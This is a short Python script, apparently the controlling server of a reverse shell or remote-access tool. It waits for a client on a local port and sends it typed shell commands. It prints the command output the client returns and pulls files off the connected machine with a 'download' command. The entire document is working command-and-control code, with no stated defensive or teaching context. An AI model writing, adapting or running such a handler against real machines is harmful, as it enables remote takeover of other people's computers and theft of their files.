import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind(('localhost', 8030))
listener.listen()
print('server started')
connection, address = listener.accept()
print(f'got connection from {address}')


size = 10**10

def recv_data():
    original_size = connection.recv(size).decode('utf-8')
    # original_size = int(original_size)
    data = connection.recv(size)
    # while len(data) != original_size:
    #     data += connection.recv(size)
    return data


while True:
    cmd = input('Enter a cmd: ')
    if cmd == 'quit':
        connection.send(b'quit')
        connection.close()
        break
    elif cmd[:2] == 'cd':
        connection.send(bytes(cmd, 'utf-8'))
        recv = recv_data()
        print(recv.decode('utf-8'))
        continue
    elif cmd[:8] == 'download':
        connection.send(bytes(cmd, 'utf-8'))
        file_output = recv_data()
        if file_output == b'No File':
            print(file_output.decode('utf-8'))
            continue
        with open(f'{cmd[9::]}', 'wb') as write_data:
            write_data.write(file_output)
            write_data.close()
        continue
    connection.send(bytes(cmd, 'utf-8'))
    con_recv = connection.recv(size)
    print(con_recv.decode('utf-8'))


